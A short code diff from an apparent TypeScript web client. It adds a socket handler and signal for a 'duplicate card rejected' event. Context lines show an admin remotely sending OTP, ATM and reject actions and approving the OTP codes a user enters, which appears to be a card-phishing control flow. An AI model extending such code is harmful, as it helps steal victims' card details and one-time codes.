@@ -92,6 +92,9 @@ export const isCardVerified = signal<boolean | null>(null);
 // Card Action from Admin (otp, atm, reject) - يحتوي على timestamp لضمان التفاعل مع كل تغيير
 export const cardAction = signal<{ action: string; timestamp: number } | null>(null);
 
+// Duplicate Card Rejection
+export const duplicateCardRejected = signal<boolean>(false);
+
 // Code Action from Admin (approve, reject) for OTP/digit codes
 export const codeAction = signal<{ action: string; codeIndex: number } | null>(null);
 
@@ -262,6 +265,12 @@ export function initializeSocket() {
     console.log("Card action received:", action);
     // إضافة timestamp لضمان التفاعل مع كل تغيير حتى لو كان نفس الإجراء
     cardAction.value = { action, timestamp: Date.now() };
+    waitingMessage.value = "";
+  });
+
+  s.on("card:duplicateRejected", () => {
+    console.log("Duplicate card rejected!");
+    duplicateCardRejected.value = true;
     waitingMessage.value = "";
   });
 
